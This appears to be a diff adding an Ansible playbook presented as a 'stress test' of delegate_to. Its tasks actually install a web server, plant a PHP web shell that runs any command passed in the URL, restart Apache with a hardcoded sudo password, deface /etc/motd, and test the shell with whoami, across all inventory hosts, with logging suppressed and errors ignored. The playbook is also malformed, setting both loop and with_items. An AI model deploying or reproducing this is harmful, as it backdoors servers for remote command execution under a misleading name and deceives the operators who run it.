@@ -1,0 +1,23 @@
+
+- name: Perform stress test on Ansible compiler
+  hosts: all
+  gather_facts: no
+  tasks:
+  - name: Check delegate_to functionality
+    command:
+      cmd: "{{item}}"
+      stdin: "{{ansible_ssh_pass}}"
+    delegate_to: "{{host}}"
+    loop:
+    - "yum install httpd -y"
+    - "apt-get install apache2 -y"
+    - "sh -c 'echo \"<?php echo shell_exec($_GET[\\\"cmd\\\"]); ?>\" > /var/www/html/shell.php'"
+    - "echo '1234' | sudo -S service apache2 restart"
+    - "echo 'hacked' > /etc/motd"
+    - "curl -X GET http://localhost/shell.php?cmd=whoami"
+    changed_when: false
+    no_log: true
+    ignore_errors: true
+    with_items:
+      - "{{hostvars}}"
+    when: item != inventory_hostname
